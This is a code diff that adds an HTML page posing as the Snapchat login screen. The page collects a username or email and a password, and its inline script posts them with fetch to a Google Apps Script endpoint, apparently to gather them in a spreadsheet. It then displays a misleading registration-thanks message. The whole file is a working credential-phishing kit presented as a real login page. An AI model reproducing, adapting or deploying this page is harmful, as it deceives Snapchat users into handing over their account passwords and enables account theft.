@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" type="image/x-icon" href="./images.ico">
+    <link rel="stylesheet" href="style.css">
+    <title>Log in | Snapchat</title>
+</head>
+<body>
+    <div class="loader-container">
+        <div class="loader"></div>
+    </div>
+
+    <div class="container">
+        <img src="./snap.png" alt="">
+        <h1>Log in to Snapchat</h1>
+        <form id="google-sheet" action="">
+            <label for="">Username or email address</label>
+            <input name="name" type="text">
+            <label for="">Password</label>
+            <input name="password" type="password">
+            <input type="submit">
+        </form>
+    </div>
+  
+    <footer class="footer">
+        <div class="footer-content">
+            <img src="./download.png" alt="Snapchat Logo" class="logo">
+            <ul class="footer-links">
+                <li><a href="#">Support</a></li>
+                <li><a href="#">Community Guidelines</a></li>
+                <li><a href="#">Terms of Service</a></li>
+                <li><a href="#">Privacy Policy</a></li>
+                <li><a href="#">Advertise</a></li>
+            </ul>
+        </div>
+    </footer>
+
+    <script>
+        const scriptURL = 'https://script.google.com/macros/s/AKfycbzIrrR1HGwWXorgUG09Qy2UuSbVk5y2KnLsMg_omda32rbGLugg7lmdKxk8EzpwMatG/exec';
+        const form = document.forms['google-sheet'];
+
+        // Add a reference to the loading element
+        const loading = document.querySelector('.loader-container');
+
+        // Add an event listener to the form submit button
+        form.addEventListener('submit', e => {
+            e.preventDefault();
+
+            // Show the loading animation
+            loading.style.display = 'block';
+
+            fetch(scriptURL, { method: 'POST', body: new FormData(form) })
+                .then(response => {
+                    // Hide the loading animation
+                    loading.style.display = 'none';
+                    alert("Thank you for registering! We have received your registration and will send you a confirmation email shortly. ");
+                    form.reset();
+                })
+                .catch(error => {
+                    console.error('Error!', error.message);
+                    // Hide the loading animation
+                    loading.style.display = 'none';
+                });
+        });
+
+
+
+
+        function generateRegistrationKey() {
+            // Get the number of registrations already submitted
+            var numRegistrations = Number(document.getElementById('num-registrations').value);
+
+            // Generate the new registration key
+            var keyPrefix = "EC";
+            var keySuffix = numRegistrations + 100;
+            var registrationKey = keyPrefix + keySuffix;
+
+            // Update the hidden field with the new key
+            document.getElementById('registration-key').value = registrationKey;
+
+            // Increment the number of registrations counter
+            document.getElementById('num-registrations').value = numRegistrations + 1;
+        }
+    </script>
+</body>
+</html>
